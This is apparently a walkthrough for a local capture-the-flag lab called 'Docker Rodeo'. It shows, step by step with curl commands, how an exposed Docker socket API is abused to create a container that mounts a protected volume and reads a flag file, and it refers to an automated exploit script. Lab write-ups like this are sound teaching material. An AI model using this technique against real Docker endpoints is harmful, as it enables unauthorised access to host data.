# Walkthrough: Docker Rodeo

## Setup

```bash
docker compose up --build -d
```

## Step 1: Enumerate

```bash
curl http://localhost:8080/
```

The service announces Docker socket access. Confirm by listing containers:

```bash
curl http://localhost:8080/api/docker/containers/json
```

## Step 2: Create Escape Container

```bash
curl -s -X POST http://localhost:8080/api/docker/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "docker-rodeo-lab:latest",
    "Cmd": ["sh", "-c", "cat /vault/flag.txt"],
    "HostConfig": {"Binds": ["docker-rodeo-vault:/vault:ro"]}
  }' | python3 -c "import sys,json; print(json.load(sys.stdin)['Id'][:12])"
```

Save the container ID as `$ID`.

## Step 3: Start and Wait

```bash
curl -s -X POST "http://localhost:8080/api/docker/containers/$ID/start"
curl -s -X POST "http://localhost:8080/api/docker/containers/$ID/wait"
```

## Step 4: Read Logs

```bash
curl -s "http://localhost:8080/api/docker/containers/$ID/logs?stdout=1"
```

Output:
```
POC{...}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[+] Flag: POC{...}
```
